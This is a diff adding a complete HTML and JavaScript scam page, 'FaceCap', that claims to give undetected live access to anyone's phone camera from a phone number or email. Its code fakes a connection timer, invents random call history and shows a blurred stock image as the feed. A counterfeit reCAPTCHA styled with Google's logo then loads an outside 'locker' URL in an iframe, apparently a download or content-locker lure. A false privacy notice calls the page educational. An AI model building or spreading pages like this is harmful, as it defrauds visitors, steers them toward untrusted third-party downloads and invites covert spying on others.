@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FaceCap - Live Activity Viewer</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #1b1b1b; color: #fafafa; min-height: 100vh; display: flex; flex-direction: column; overflow: hidden; position: relative; }
+        
+        header { padding: 16px; font-weight: 500; font-size: 16px; color: #fafafa; position: absolute; top: 0; left: 0; width: 100%; z-index: 10; }
+        .container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 16px; text-align: center; z-index: 2; position: relative; width: 100%; max-width: 420px; margin: 0 auto; height: 100%; }
+
+        /* 🔥 الخلفية المضببة */
+        .blur-bg { 
+            position: absolute; inset: -50px; 
+            background-image: url('/assets/camera-view-tfK15Pz1.jpg'); 
+            background-size: cover; background-position: center; 
+            filter: blur(40px) brightness(0.4); 
+            opacity: 0; transition: opacity 1s ease; z-index: 1; pointer-events: none; 
+        }
+
+        .icon-gradient { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(to bottom right, #22d3ee, #10b981); display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+        .title-h2 { font-size: 20px; font-weight: 600; color: #fafafa; margin-bottom: 6px; }
+        .subtitle-xs { color: #a1a1aa; font-size: 12px; margin-bottom: 24px; }
+
+        .toggle-container { display: flex; gap: 8px; width: 100%; max-width: 280px; margin-bottom: 24px; }
+        .toggle-btn { flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px; padding: 8px 16px; border-radius: 9999px; font-size: 12px; font-weight: 600; cursor: pointer; border: none; transition: 0.2s; }
+        .toggle-btn.active { background-color: #3b82f6; color: #ffffff; }
+        .toggle-btn.inactive { background-color: #27272a; color: #fafafa; }
+
+        .input-wrapper { width: 100%; margin-bottom: 12px; position: relative; }
+        .input-box { width: 100%; display: flex; align-items: center; justify-content: space-between; padding: 12px 20px; background-color: #27272a; border-radius: 16px; color: #fafafa; border: none; font-size: 14px; cursor: pointer; }
+        .phone-prefix { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #a1a1aa; font-size: 16px; }
+        .phone-input { width: 100%; padding: 12px 20px 12px 64px; background-color: #27272a; border-radius: 16px; color: #fafafa; border: none; font-size: 16px; outline: none; }
+        
+        .dropdown-menu { display: none; position: absolute; top: 100%; left: 0; width: 100%; background: #18181b; border: 1px solid #3f3f46; border-radius: 12px; margin-top: 5px; z-index: 50; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        .search-box { padding: 10px; border-bottom: 1px solid #3f3f46; }
+        .search-box input { width: 100%; padding: 8px 12px; background: #27272a; border: none; border-radius: 8px; color: white; outline: none; font-size: 14px; }
+        .country-list { max-height: 200px; overflow-y: auto; }
+        .country-item { padding: 12px 15px; display: flex; align-items: center; gap: 10px; cursor: pointer; text-align: left; transition: 0.2s; font-size: 14px; }
+        .country-item:hover { background: #27272a; }
+
+        .btn-continue { width: 100%; padding: 14px; border-radius: 16px; font-size: 14px; font-weight: 600; background-color: #3f3f46; color: #a1a1aa; border: none; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .btn-continue.ready { background-color: #3b82f6; color: white; }
+
+        .icon-grey { background: #27272a; width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+        .icon-profile { width: 100px; height: 100px; background: rgba(39, 39, 42, 0.7); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; backdrop-filter: blur(10px); }
+        .icon-profile svg { fill: #fafafa; width: 50px; height: 50px; }
+        .text-green { color: #10b981; font-size: 14px; margin-top: 5px; font-weight: 500; }
+        
+        .btn-row { display: flex; justify-content: space-between; gap: 12px; width: 100%; margin-top: 40px; margin-bottom: 20px; }
+        .btn-half { flex: 1; padding: 14px; border-radius: 16px; font-size: 14px; font-weight: 600; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-green { background-color: #10b981; color: white; }
+        .btn-white { background-color: #ffffff; color: #000000; }
+        
+        .btn-close { width: 100%; padding: 14px; border-radius: 9999px; background-color: #27272a; color: #fafafa; border: none; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+
+        .progress-container { width: 80%; background: #27272a; height: 4px; border-radius: 2px; margin-top: 20px; overflow: hidden; }
+        .progress-bar { height: 100%; width: 0%; background: #3b82f6; transition: width 4s linear; }
+
+        .footer-link { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); color: #3b82f6; font-size: 13px; text-decoration: none; z-index: 10; font-weight: 500; }
+        .footer-link:hover { text-decoration: underline; }
+
+        /* 🔥 Modals (History, Live, Privacy, Verify, Locker) */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; display: none; justify-content: center; align-items: center; padding: 20px; opacity: 0; transition: opacity 0.3s ease; }
+        .modal-overlay.active { display: flex; opacity: 1; }
+        .modal-content { background: #09090b; width: 100%; max-width: 380px; border-radius: 20px; overflow: hidden; border: 1px solid #27272a; }
+        .modal-header { display: flex; justify-content: space-between; padding: 16px 20px; border-bottom: 1px solid #27272a; font-weight: 600; font-size: 14px; }
+        
+        .modal-video { width: 100%; height: 220px; position: relative; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .modal-video::before { content: ""; position: absolute; inset: -20px; background-image: url('/assets/camera-view-tfK15Pz1.jpg'); background-size: cover; background-position: center; filter: blur(15px) brightness(0.5); z-index: 0; }
+        
+        .waiting-box { display: flex; flex-direction: column; align-items: center; z-index: 2; position: relative; }
+        .waiting-box svg { width: 40px; height: 40px; color: #fafafa; margin-bottom: 15px; opacity: 0.9; }
+        
+        .bouncing-dots { display: flex; gap: 6px; }
+        .bouncing-dots span { width: 10px; height: 10px; background-color: #3b82f6; border-radius: 50%; display: inline-block; animation: bounce 1.4s infinite ease-in-out both; }
+        .bouncing-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .bouncing-dots span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
+
+        .modal-details { padding: 16px 20px; background: #18181b; }
+        .detail-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; color: #a1a1aa; }
+
+        /* 🔥 Big White Captcha */
+        .verify-modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 1000; opacity: 0; transition: opacity 0.3s; }
+        .verify-modal-overlay.active { display: flex; opacity: 1; }
+        .verify-box { background: #fff; width: 90%; max-width: 360px; border-radius: 12px; padding: 24px; text-align: center; }
+        .recaptcha-cont { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; box-shadow: 0px 0px 4px 1px rgba(0,0,0,0.08); padding: 10px 12px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: 0.2s; margin-bottom: 5px; }
+        .recaptcha-cont:hover { box-shadow: 0px 0px 4px 1px rgba(0,0,0,0.15); }
+        .recaptcha-checkbox { width: 28px; height: 28px; background: #fff; border: 2px solid #c1c1c1; border-radius: 2px; }
+        .rc-spinner { display: none; border: 2px solid #f3f3f3; border-top: 2px solid #3b82f6; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* 🔥 Locker */
+        .locker-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 9999; }
+        .locker-overlay.active { display: flex; }
+        .locker-modal-box { width: 100%; max-width: 500px; height: 85vh; background: #fff; border-radius: 16px; overflow: hidden; position: relative; }
+        .locker-iframe { width: 100%; height: 100%; border: none; }
+
+        .step { display: none; width: 100%; flex-direction: column; align-items: center; justify-content: center; height: 100%; }
+        .step.active { display: flex; animation: fadeIn 0.4s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div class="blur-bg" id="blurBg"></div>
+    <header>FaceCap</header>
+
+    <div class="container">
+        
+        <div class="step active" id="step1">
+            <div style="flex:1; display:flex; flex-direction:column; justify-content:center; align-items:center; width:100%;">
+                <div class="icon-gradient">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg>
+                </div>
+                <h2 class="title-h2">Live Camera Access</h2>
+                <p class="subtitle-xs">This does not notify the device owner.</p>
+
+                <div class="toggle-container">
+                    <button class="toggle-btn active" onclick="switchTab('phone')" id="btnPhone">
+                        <svg width="14" height="14" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg> Phone
+                    </button>
+                    <button class="toggle-btn inactive" onclick="switchTab('email')" id="btnEmail">
+                        <svg width="14" height="14" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="20" height="16" x="2" y="4" rx="2"></rect><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path></svg> Email
+                    </button>
+                </div>
+
+                <div class="input-wrapper" id="countryWrapper">
+                    <div class="input-box" onclick="toggleDropdown()">
+                        <div style="display:flex; align-items:center; gap:8px;" id="selectedCountry">
+                            <span style="font-size: 20px;">🇺🇸</span> <span>United States</span>
+                        </div>
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#a1a1aa" stroke-width="2"><path d="m6 9 6 6 6-6"></path></svg>
+                    </div>
+                    
+                    <div class="dropdown-menu" id="countryDropdown">
+                        <div class="search-box">
+                            <input type="text" id="countrySearch" placeholder="Search country..." oninput="filterCountries()">
+                        </div>
+                        <div class="country-list" id="countryList"></div>
+                    </div>
+                </div>
+
+                <div class="input-wrapper">
+                    <span class="phone-prefix" id="prefix">+1</span>
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="phone-input" placeholder="(123) 456-7890" id="targetInput" oninput="handleInput(event)">
+                </div>
+
+                <button class="btn-continue" id="btnContinue" onclick="startConnection()" disabled>Continue</button>
+            </div>
+            
+            <a href="#" class="footer-link" onclick="openPrivacyModal()">Privacy Policy</a>
+        </div>
+
+        <div class="step" id="step2">
+            <div class="icon-grey">
+                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg>
+            </div>
+            <h2 class="title-h2">Connecting</h2>
+            <p class="subtitle-xs">Please wait...</p>
+            <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+        </div>
+
+        <div class="step" id="step3">
+            <div style="flex:1; display:flex; flex-direction:column; justify-content:center; align-items:center; width:100%;">
+                <div class="icon-profile">
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                </div>
+                <h2 class="title-h2">Device Online</h2>
+                <p class="text-green">Live Camera Available</p>
+                <div class="btn-row">
+                    <button class="btn-half btn-green" onclick="openHistory()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/><path d="M12 7v5l4 2"/></svg> View History
+                    </button>
+                    <button class="btn-half btn-white" onclick="openLiveFeed()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m16 13 5.223 3.482a.5.5 0 0 0 .777-.416V7.87a.5.5 0 0 0-.752-.432L16 10.5"/><rect x="2" y="6" width="14" height="12" rx="2"/></svg> View Live
+                    </button>
+                </div>
+                <p class="subtitle-xs" style="margin-bottom:0;">Target won't be notified</p>
+            </div>
+            
+            <div style="width: 100%; padding-bottom: 30px; display: flex; flex-direction: column; align-items: center;">
+                <div style="display:flex; align-items:center; gap:6px; color:#a1a1aa; font-size:12px; font-weight:500; margin-bottom: 10px;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a4 4 0 0 1 8 0v4"></path></svg>
+                    End-to-end encrypted
+                </div>
+                <button class="btn-close" onclick="location.reload()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="privacyModal">
+        <div class="modal-content" style="background: #1e1e22; padding: 24px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
+                <h2 style="font-size:18px; font-weight:bold; color:white;">Privacy Policy</h2>
+                <span style="cursor:pointer; color:#a1a1aa; font-size:18px;" onclick="closePrivacyModal()">✕</span>
+            </div>
+            <div style="font-size:13px; color:#a1a1aa; line-height:1.6; margin-bottom:20px;">
+                <p style="margin-bottom: 10px;">We respect your privacy. This tool is provided for educational and security testing purposes only.</p>
+                <p style="margin-bottom: 10px;">We do not store, share, or collect any personal information, phone numbers, or device details entered on this portal.</p>
+                <p>The verification process is required to prevent automated bot abuse and ensure server stability.</p>
+            </div>
+            <button class="btn-close" style="margin-top:0;" onclick="closePrivacyModal()">I Understand</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="historyModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span style="color:#10b981; display:flex; align-items:center; gap:6px;">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/><path d="M12 7v5l4 2"/></svg> Call History
+                </span>
+                <span style="cursor:pointer; color:#a1a1aa;" onclick="document.getElementById('historyModal').classList.remove('active')">✕</span>
+            </div>
+            <div style="padding: 10px 20px; max-height: 300px; overflow-y: auto;" id="historyList"></div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="liveModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span style="color:#3b82f6; display:flex; align-items:center; gap:6px;">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m16 13 5.223 3.482a.5.5 0 0 0 .777-.416V7.87a.5.5 0 0 0-.752-.432L16 10.5"/><rect x="2" y="6" width="14" height="12" rx="2"/></svg> Live Camera
+                </span>
+            </div>
+            <div class="modal-video">
+                <div class="waiting-box">
+                    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="m16 13 5.223 3.482a.5.5 0 0 0 .777-.416V7.87a.5.5 0 0 0-.752-.432L16 10.5"/><rect x="2" y="6" width="14" height="12" rx="2"/></svg>
+                    <div class="bouncing-dots"><span></span><span></span><span></span></div>
+                </div>
+            </div>
+            <div class="modal-details">
+                <div class="detail-row"><span>Device</span><span style="color:#fafafa; font-weight:600;">iPhone</span></div>
+                <div class="detail-row"><span>Status</span><span class="text-green">Active</span></div>
+                <div class="detail-row"><span>Quality</span><span style="color:#3b82f6; font-weight:bold;">HD / 2K</span></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="verify-modal-overlay" id="verifyModal">
+        <div class="verify-box">
+            <h3 style="font-weight: 400; font-size: 22px; color: #000; margin-bottom: 4px;">Verify that it's you</h3>
+            <p style="color: #4b5563; font-size: 14px; margin-bottom: 24px;">Confirm that you're not a robot</p>
+            
+            <div class="recaptcha-cont" onclick="startCaptcha(event)">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <div class="recaptcha-checkbox" id="rc-check"></div>
+                    <div class="rc-spinner" id="rc-spinner"></div>
+                    <span style="color: #222; font-weight: 400; font-size: 14px;">I'm not a robot</span>
+                </div>
+                <div style="display: flex; flex-direction: column; align-items: center;">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style="width: 32px; opacity: 0.8; margin-bottom: 4px;">
+                    <div style="font-size: 10px; color: #555; display: flex; gap: 4px; font-weight: 500;">
+                        <a href="https://policies.google.com/privacy" target="_blank" style="text-decoration: none; color: #555;" onclick="event.stopPropagation()">Privacy</a> - 
+                        <a href="https://policies.google.com/terms" target="_blank" style="text-decoration: none; color: #555;" onclick="event.stopPropagation()">Terms</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="locker-overlay" id="lockerModal">
+        <div class="locker-modal-box">
+            <button onclick="closeLocker()" style="position: absolute; top: 8px; right: 8px; width: 32px; height: 32px; border-radius: 50%; background: rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: center; color: #000; border: none; cursor: pointer; z-index: 50;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+            </button>
+            <iframe id="lockerIframe" class="locker-iframe"></iframe>
+        </div>
+    </div>
+
+    <script>
+        const tier1Countries = [
+            { name: 'United States', code: '+1', flag: '🇺🇸', mask: "(###) ###-####", max: 10 },
+            { name: 'United Kingdom', code: '+44', flag: '🇬🇧', mask: "#### ######", max: 10 },
+            { name: 'Canada', code: '+1', flag: '🇨🇦', mask: "(###) ###-####", max: 10 },
+            { name: 'Australia', code: '+61', flag: '🇦🇺', mask: "### ### ###", max: 9 },
+            { name: 'Germany', code: '+49', flag: '🇩🇪', mask: "### #######", max: 10 },
+            { name: 'France', code: '+33', flag: '🇫🇷', mask: "# ## ## ## ##", max: 9 }
+        ];
+
+        let selectedCountryIndex = 0;
+        const countryList = document.getElementById('countryList');
+        const inputField = document.getElementById('targetInput');
+        const btnContinue = document.getElementById('btnContinue');
+
+        function renderCountries(list) {
+            countryList.innerHTML = '';
+            list.forEach((c, i) => {
+                const div = document.createElement('div');
+                div.className = 'country-item';
+                div.innerHTML = `<span style="font-size:20px">${c.flag}</span> <span>${c.name} (${c.code})</span>`;
+                div.onclick = () => selectCountry(c, i);
+                countryList.appendChild(div);
+            });
+        }
+        renderCountries(tier1Countries);
+
+        function toggleDropdown() {
+            const dropdown = document.getElementById('countryDropdown');
+            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function filterCountries() {
+            const query = document.getElementById('countrySearch').value.toLowerCase();
+            const filtered = tier1Countries.filter(c => c.name.toLowerCase().includes(query));
+            renderCountries(filtered);
+        }
+
+        function selectCountry(c, index) {
+            selectedCountryIndex = index;
+            document.getElementById('selectedCountry').innerHTML = `<span style="font-size: 20px;">${c.flag}</span> <span>${c.name}</span>`;
+            document.getElementById('prefix').innerText = c.code;
+            
+            inputField.placeholder = c.mask.replace(/#/g, 'X');
+            inputField.value = '';
+            
+            toggleDropdown();
+            inputField.focus();
+            checkInput('');
+        }
+
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('#countryWrapper')) {
+                document.getElementById('countryDropdown').style.display = 'none';
+            }
+        });
+
+        function switchTab(type) {
+            if(type === 'phone') {
+                document.getElementById('btnPhone').className = 'toggle-btn active';
+                document.getElementById('btnEmail').className = 'toggle-btn inactive';
+                document.getElementById('countryWrapper').style.display = 'block';
+                document.getElementById('prefix').style.display = 'block';
+                inputField.style.paddingLeft = '64px';
+                inputField.placeholder = tier1Countries[selectedCountryIndex].mask.replace(/#/g, 'X');
+                inputField.type = 'tel';
+                inputField.inputMode = 'numeric';
+                inputField.value = '';
+            } else {
+                document.getElementById('btnEmail').className = 'toggle-btn active';
+                document.getElementById('btnPhone').className = 'toggle-btn inactive';
+                document.getElementById('countryWrapper').style.display = 'none';
+                document.getElementById('prefix').style.display = 'none';
+                inputField.style.paddingLeft = '20px';
+                inputField.placeholder = 'apple@icloud.com';
+                inputField.type = 'email';
+                inputField.removeAttribute('inputmode');
+                inputField.value = '';
+            }
+            checkInput();
+        }
+
+        // 🔥 Strict Numeric Input logic
+        function handleInput(e) {
+            let val = e.target.value.replace(/\D/g, ''); 
+            const currentCountry = tier1Countries[selectedCountryIndex];
+            
+            if (val.length > currentCountry.max) val = val.substring(0, currentCountry.max);
+            
+            let formatted = '', mask = currentCountry.mask, valIdx = 0;
+            for (let i = 0; i < mask.length; i++) {
+                if (valIdx >= val.length) break;
+                if (mask[i] === '#') formatted += val[valIdx++];
+                else formatted += mask[i];
+            }
+            e.target.value = formatted;
+            checkInput(val);
+        }
+
+        function checkInput(rawVal = '') {
+            const currentCountry = tier1Countries[selectedCountryIndex];
+            if (rawVal.length >= currentCountry.max - 1 || (inputField.type === 'email' && inputField.value.includes('@'))) { 
+                btnContinue.disabled = false;
+                btnContinue.classList.add('ready');
+            } else {
+                btnContinue.disabled = true;
+                btnContinue.classList.remove('ready');
+            }
+        }
+
+        function startConnection() {
+            if(btnContinue.disabled) return;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+
+            setTimeout(() => document.getElementById('progressBar').style.width = '100%', 50);
+
+            setTimeout(() => {
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+                document.getElementById('blurBg').style.opacity = '1';
+            }, 4000);
+        }
+
+        // 🔥 Privacy Modal Logic
+        function openPrivacyModal() { document.getElementById('privacyModal').classList.add('active'); }
+        function closePrivacyModal() { document.getElementById('privacyModal').classList.remove('active'); }
+
+        // 🔥 Random Call History Logic
+        function openHistory() {
+            const list = document.getElementById('historyList');
+            list.innerHTML = '';
+            const times = ['Today, 14:32', 'Today, 09:15', 'Yesterday, 22:40', 'Yesterday, 18:05', 'Monday, 11:20'];
+            
+            for(let i=0; i<5; i++) {
+                const dur = Math.floor(Math.random() * 15) + 1;
+                const sec = Math.floor(Math.random() * 59);
+                const isPhone = Math.random() > 0.5;
+                const title = isPhone ? "+1 (" + Math.floor(Math.random()*900+100) + ") " + Math.floor(Math.random()*900+100) + "-" + Math.floor(Math.random()*9000+1000) : "FaceTime Video";
+                
+                list.innerHTML += `
+                    <div style="display:flex; justify-content:space-between; align-items:center; padding: 12px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
+                        <div style="display:flex; align-items:center; gap:12px;">
+                            <div style="width:36px; height:36px; border-radius:50%; background:rgba(16, 185, 129, 0.1); color:#10b981; display:flex; align-items:center; justify-content:center;">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/><path d="M12 7v5l4 2"/></svg>
+                            </div>
+                            <div style="text-align: left;">
+                                <div style="font-size:14px; font-weight:600; color:#fff;">${title}</div>
+                                <div style="font-size:12px; color:#a1a1aa;">${times[i]}</div>
+                            </div>
+                        </div>
+                        <div style="font-size:13px; color:#a1a1aa; font-family:monospace;">${dur}:${sec < 10 ? '0'+sec : sec}</div>
+                    </div>`;
+            }
+            document.getElementById('historyModal').classList.add('active');
+        }
+
+        // 🔥 View Live Flow & Captcha Trigger
+        function openLiveFeed() {
+            document.getElementById('liveModal').classList.add('active');
+            
+            // 3 seconds of connecting dots, then show Captcha
+            setTimeout(() => { 
+                document.getElementById('liveModal').classList.remove('active');
+                document.getElementById('verifyModal').classList.add('active');
+            }, 3000);
+        }
+
+        function startCaptcha(event) {
+            document.getElementById('rc-check').style.display = 'none';
+            document.getElementById('rc-spinner').style.display = 'block';
+
+            setTimeout(() => {
+                document.getElementById('verifyModal').classList.remove('active');
+                
+                // Reset for next time
+                document.getElementById('rc-check').style.display = 'block';
+                document.getElementById('rc-spinner').style.display = 'none';
+                
+                showLocker();
+            }, 1200);
+        }
+
+        function showLocker() {
+            const lockerUrl = "https://performingsecurity.downapk.online/cl/i/j77o9j"; 
+            document.getElementById('lockerIframe').src = lockerUrl;
+            document.getElementById('lockerModal').classList.add('active');
+        }
+
+        function closeLocker() {
+            document.getElementById('lockerModal').classList.remove('active');
+            setTimeout(() => { document.getElementById('lockerIframe').src = 'about:blank'; }, 300);
+        }
+    </script>
+</body>
+</html>
